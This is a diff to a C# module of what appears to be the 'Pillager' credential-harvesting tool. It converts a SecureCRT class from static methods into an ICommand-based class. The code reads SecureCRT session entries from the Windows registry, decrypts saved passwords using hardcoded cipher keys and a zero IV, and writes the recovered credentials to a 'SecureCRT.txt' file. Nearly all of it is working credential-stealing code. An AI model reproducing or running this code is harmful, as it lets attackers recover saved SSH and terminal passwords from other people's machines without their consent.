@@ -8,11 +8,9 @@ using System.Text;
 
 namespace Pillager.Tools
 {
-    internal class SecureCRT
+    internal class SecureCRT : ICommand
     {
-        public static string ToolName = "SecureCRT";
-
-        public static string DecryptV2(string input, string passphrase = "")
+        public string DecryptV2(string input, string passphrase = "")
         {
             try
             {
@@ -89,7 +87,7 @@ namespace Pillager.Tools
             }
         }
 
-        private static byte[] fromhex(string hex)
+        private byte[] fromhex(string hex)
         {
             byte[] mybyte = new byte[int.Parse(Math.Ceiling(hex.Length / 2.0).ToString())];
             for (int i = 0; i < mybyte.Length; i++)
@@ -101,7 +99,7 @@ namespace Pillager.Tools
             return mybyte;
         }
 
-        public static string Decrypt(string str)
+        public string Decrypt(string str)
         {
             byte[] IV = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
             byte[] Key1 = { 0x24, 0xa6, 0x3d, 0xde, 0x5b, 0xd3, 0xb3, 0x82, 0x9c, 0x7e, 0x06, 0xf4, 0x08, 0x16, 0xaa, 0x07 };
@@ -124,7 +122,7 @@ namespace Pillager.Tools
             return ciphered;
         }
 
-        public static string GetInfo()
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             string name = "Software\\VanDyke\\SecureCRT";
@@ -163,15 +161,15 @@ namespace Pillager.Tools
             return sb.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string output = GetInfo();
                 if (string.IsNullOrEmpty(output)) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "SecureCRT");
                 Directory.CreateDirectory(savepath);
-                File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                File.WriteAllText(Path.Combine(savepath, "SecureCRT.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
